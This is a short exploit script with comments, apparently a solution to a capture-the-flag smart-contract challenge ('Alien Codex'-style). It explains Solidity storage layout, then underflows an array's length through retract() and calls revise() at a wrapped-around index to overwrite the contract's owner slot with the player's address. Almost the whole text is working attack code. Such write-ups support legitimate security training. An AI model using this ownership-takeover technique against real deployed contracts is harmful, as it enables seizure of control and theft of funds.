/* 
	A few notes :
		* Variable 'owner' storage is located at offset 0 in the contract with the 'contact' boolean since they can both fit on 32 bytes
		* Array 'codex' length is stored at offset 1 and according to documentation, array content is stored at keccak256(offset) = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
		* Since there is no SafeMath (solidity < 0.8.0), underflow is possible via function 'retract()'
		* Use function 'revise()' to modify any storage variable. Overflow is possible for the index with an index starting at 2**256 - keccak256(offset) = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30
*/ 
await contract.make_contact()
await contract.retract() // Array length underflow, is now 2**256-1
player_encoded = web3.utils.encodePacked({"type": "bytes12", "value": "0"}, {"type": "address", "value": player})
await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30", player_encoded)